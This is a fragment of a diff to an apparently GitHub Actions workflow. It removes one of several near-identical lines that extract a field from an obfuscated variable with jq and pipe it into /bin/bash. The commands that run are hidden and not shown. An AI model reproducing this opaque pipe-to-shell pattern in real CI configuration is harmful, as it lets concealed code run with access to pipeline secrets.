@@ -23,7 +23,6 @@ jobs:
           echo $muftq4581 | jq -r .q9465 | /bin/bash
           printf '%s' "$fq6653" | jq -r .ixbb87200 | /bin/bash
           echo $ktxy80061 | jq -r .hlipb8 | /bin/bash
-          echo $ps0364 | jq -r .s13 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
